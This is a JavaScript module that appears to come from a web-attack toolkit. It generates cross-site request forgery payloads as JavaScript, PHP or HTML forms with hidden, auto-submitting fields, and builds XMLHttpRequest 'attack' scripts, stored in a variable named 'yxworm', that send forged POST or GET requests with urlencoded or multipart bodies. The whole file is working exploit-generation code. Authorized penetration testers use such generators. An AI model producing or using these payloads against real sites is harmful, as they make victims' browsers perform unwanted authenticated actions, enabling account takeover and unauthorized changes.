/* eslint-disable */
export default function () {
  var codz = {}
  codz.so = {}

  codz.csrf = function(method, action, kv, csrf_lang){

  	if(method == 'GET'){
  		return action + "?" + kv;
  	}else{
  		switch(csrf_lang){
  			case "js":
  				var _js = "";
  				_js = "function new_form(){\n";
  				_js += "	var f = document.createElement(\"form\");\n";
  				_js += "	document.body.appendChild(f);\n";
  				_js += "	f.method = \"post\";\n";
  				_js += "	return f;\n";
  				_js += "}\n";
  				_js += "function create_elements(eForm, eName, eValue){\n";
  				_js += "	var e = document.createElement(\"input\");\n";
  				_js += "	eForm.appendChild(e);\n";
  				_js += "	e.type = \'text\';\n";
  				_js += "	e.name = eName;\n";
  				_js += "	if(!document.all){e.style.display = \'none\';}else{\n";
  				_js += "		e.style.display = \'block\';\n";
  				_js += "		e.style.width = \'0px\';\n";
  				_js += "		e.style.height = \'0px\';\n";
  				_js += "	}\n";
  				_js += "	e.value = eValue;\n";
  				_js += "	return e;\n";
  				_js += "}\n";
  				_js += "var _f = new_form();\n";
  				var js_args = kv.split("&");
  				for(var i=0; i<js_args.length; i++){
  					var js_arg = js_args[i].split("=");
  					_js += "create_elements(_f, \"" + js_arg[0] + "\", \"" + js_arg[1] + "\");\n";
  				}
  				_js += "_f.action= \"" + action + "\";\n";
  				_js += "_f.submit();\n";
  				return _js
  				break;
  			case "php":
  				var php_args = kv.split("&");
  				var _php = "<?php\n";
  				_php += "$s = \"<form method=\'post\' action=\'" + action + "\'>\";\n";
  				for(var i=0; i<php_args.length; i++){
  					var php_arg = php_args[i].split("=");
  					_php += "$s = $s.\"<input type=\'text\' value=\'" + php_arg[1] + "\' name=\'" + php_arg[0] + "\' style=\'display:none!important;display:block;width=0;height=0\' \/>\";\n";
  				}
  				_php += "$s = $s.\"<\/form>\";\n";
  				_php += "$s = $s.\"<script>document.forms[0].submit();<\/script>\";\n";
  				_php += "echo($s);\n";
  				_php += "?>\n";
  				_php += "\n";
  				return _php;
  				break;
  			case "html":
  				var html_args = kv.split('&');
  				var _html = '<form action="' + action + '" method="' + method + '">\n';
  				for(var i=0; i<html_args.length; i++){
  					var html_arg = html_args[i].split("=");
  					_html += '<input type="text" name="' + html_arg[0] + '" value="' + html_arg[1] + '" style="display:none!important;display:block;width=0;height=0">\n'
  				}
  				_html += '<input type="submit" value="Submit">\n';
  				_html += '</form>';
  				return _html;
  				break;
  		}
  	}
  }

  codz.ajax = function(method, action, kv, form_type){
  	var old_kv = kv;
  	var old_action = action;
  	if(method=="GET"){
  		if(action.indexOf('?')!=-1){
  			if(action.lastIndexOf('?')+1==action.length) action = action + kv;
  			else action = action + '&' + kv;
  		}else action = action + '?' + kv;
  		kv = '';
  		form_type = 3;
  	}
  	if(!form_type){
  		form_type = 3;
  	}

  	var yxworm = "";
  	yxworm += "xhr = function(){\n";
  	yxworm += "  /*AJAX*/\n";
  	yxworm += "  var request = false;\n";
  	yxworm += "  if(window.XMLHttpRequest) {\n";
  	yxworm += "    request = new XMLHttpRequest();\n";
  	yxworm += "  } else if(window.ActiveXObject) {\n";
  	yxworm += "    try {\n";
  	yxworm += "      request = new window.ActiveXObject('Microsoft.XMLHTTP');\n";
  	yxworm += "    } catch(e) {}\n";
  	yxworm += "  }\n";
  	yxworm += "  return request;\n";
  	yxworm += "}();\n";
  	yxworm += "\n";
  	yxworm += "request = function(method,src,argv,content_type){\n";
  	yxworm += "  xhr.open(method,src,false);\n";
  	yxworm += "  if(method=='POST')xhr.setRequestHeader('Content-Type',content_type);\n";
  	yxworm += "  xhr.send(argv);\n";
  	yxworm += "  return xhr.responseText;\n";
  	yxworm += "}\n\n";
  	
  	yxworm += "attack_a = function(){\n";
  	yxworm += "  var src = \"" + action + "\";\n";
  	var kvs = kv.split("&");
  	if(kv){
  		for(var i=0; i<kvs.length; i++){
  			var k_v = kvs[i].split("=");
  			yxworm += "  var " + k_v[0] + " = \"" + k_v[1] + "\";\n";
  		}
  	}
  	if(form_type==1){
  		yxworm += "  var argv_0 = \"\\r\\n\";\n";
  		for(i=0; i<kvs.length; i++){
  			k_v = kvs[i].split("=");
  			yxworm += "  argv_0 += \"---------------------7964f8dddeb95fc5\\r\\nContent-Disposition: form-data; name=\\\"" + k_v[0] + "\\\"\\r\\n\\r\\n\";\n";
  			yxworm += "  argv_0 += (" + k_v[0] + "+\"\\r\\n\");\n";
  		}
  		yxworm += "  argv_0 += \"---------------------7964f8dddeb95fc5--\\r\\n\";\n";
  		yxworm += "  request(\"POST\",src,argv_0,\"multipart/form-data; boundary=-------------------7964f8dddeb95fc5\");\n";
  		yxworm += "}\n";
  	}else if(form_type==2){
  		var hi_yxworm = "";
  		if(kv){
  			for(var i=0; i<kvs.length; i++){
  				k_v = kvs[i].split("=");
  				if(i==kvs.length-1) hi_yxworm += "\"&"+k_v[0]+"=\"+"+k_v[0]+";\n";
  				else if(i==1) hi_yxworm += "\""+k_v[0]+"=\"+"+k_v[0]+"+";
  				else hi_yxworm += "\"&"+k_v[0]+"=\"+"+k_v[0]+"+";
  			}
  		}else hi_yxworm += "\"\";\n";
  		yxworm += "  var argv_0 = " + hi_yxworm;
  		yxworm += "  request(\""+method+"\",src,argv_0,\"application/x-www-form-urlencoded\");\n";
  		yxworm += "}\n";
  	}else if(form_type == 3){
  		var jq_param = '';
  		var jq_args = old_kv.split("&");
  		for(var i=0; i<jq_args.length; i++){
  			var jq_arg = jq_args[i].split("=");
  			jq_param += jq_arg[0] + ':"' + jq_arg[1] + '",'
  		}
  		var _jq = '$.' + method.toLowerCase()
 + '("' + old_action + '",{' + jq_param + '},function(result){\n';
  		_jq += '  // callback func\n';
  		_jq += '});'
  		return _jq
  	}
  	return yxworm;
  }
  return codz
}
